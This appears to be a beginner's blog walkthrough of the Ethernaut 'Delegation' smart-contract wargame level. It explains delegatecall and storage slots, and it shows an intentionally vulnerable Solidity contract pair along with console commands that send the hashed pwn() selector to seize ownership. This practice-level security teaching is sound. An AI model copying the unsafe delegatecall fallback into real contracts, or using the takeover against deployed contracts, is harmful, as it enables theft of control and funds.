---
title: "Ethernaut - Walkthrough for Noobs - 6 - Delegation"
datePublished: Fri Mar 17 2023 15:37:03 GMT+0000 (Coordinated Universal Time)
cuid: clfcpe3mr000709jldcvt230q
slug: ethernaut-walkthrough-for-noobs-6-delegation
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1679052171155/903038d4-29d9-4546-96d0-c6a1ad779aad.jpeg
tags: ethereum, smart-contracts, 2articles1week, ethernaut, smart-contract-audit-services

---

This challenge is also fairly simple and introduces the concept of `delegatecall`. Per usual, I would give you all the tools to solve this on your own and then provide a solution.

> The goal of this level is for you to claim ownership of the instance you are given.

### Background

Let's see what a `delegate call` is according to solidity docs:

> **delegatecall** is identical to a message call apart from the fact that the code at the target address is executed in the context of the calling contract and `msg.sender` and `msg.value` do not change their values.

in a less jargonish way, a `delegatecall` basically says, that I am a contract and I am delegating you to do anything with my storage.

For Example:

In a `call` function: A calls on B, ==&gt; context and storage of B is used.

In a `delegatecall` function: A delegates call on B, ==&gt; context and storage of A is used.

![I don't own the images](https://cdn.hashnode.com/res/hashnode/image/upload/v1679055080644/4f907f56-8f01-41ca-8a33-be36d0fba06f.jpeg align="center")

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1679055095835/88b37019-191f-4d3f-b224-68e034ddf34f.jpeg align="center")

Note: "While using `delegatecall` , understand that it preserves context and only use it when the storage layout is the same for the contract calling `delegatecall` and the contract getting called"

Here is what storage layout means:

```solidity
contract Example{
    uint a; //slot 0
    uint b; //slot 1
```

If the storage layout is not the same the data will go into a different variable.

### Code of Importance & Problems

Observe that we have two different contracts here. The explanation for both is in the comments.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {

  address public owner; //sets state variable owner

  constructor(address _owner) { //initializes owner
    owner = _owner;
  }

  function pwn() public { 
    owner = msg.sender; //this can make us the owner..keep in mind. 
  }
}
```

```solidity
contract Delegation {

  address public owner;
  Delegate delegate; // a reference to the Delegate contract above

  constructor(address _delegateAddress) { //takes address as input 
    delegate = Delegate(_delegateAddress); //initialises delegate state variable
    owner = msg.sender; //sender is initialised as owner 
  }

  fallback() external { //fallback function (refer 1st challenge)
    (bool result,) = address(delegate).delegatecall(msg.data);//stores the success of delegatecall in result.
    if (result) { //if true creates a 'this' instance.
      this; //keeps going with the contract code. 
    }
  }
}
```

Now, how to tackle the code, let's backtrace our thinking.

1. Now, since `delegatecall` is used, the context (`msg.sender`, `msg.value`) of the "Delegation" contract will be used, to invoke the `pwn()` function in the "delegate" contract.
    
2. Also notice that, the storage slot for `owner` is the same in both contracts.
    
3. **In short, this will behave as if the** `pwn()` **function is in the "Delegation" contract.**
    

Here is briefly the timeline of exploit:

* Trigger the fallback function whilst invoking the `pwn()` function using msg.data.
    
* Triggers the `pwn()` function in the delegate contract.
    
* but the storage of the Delegation contract is used.
    
* Updates `owner = msg.sender(us)` according to the `pwn()` function in the delegation contract.
    

### Solution

* Create a new level instance and open up the console.
    
* ```solidity
      var attack = web3.utils.keccak256("pwn()") //saves hashed pwn() in attack.
      //we require the hashed version of pwn() to pass it as msg.data.
    ```
    
* ```solidity
      contract.sendTransaction({data: attack}) //sending a transaction with msg.data as attack which will trigger the pwn() function. 
      //Since, there is no function to accept the transaction, it will trigger the fallback function which will delegate it and....Ah Shit, here we go again.
    ```
    
* ```solidity
      await contract.owner() //check whether you are the owner.
    ```
    
* Submit Instance.
    

Delegation✅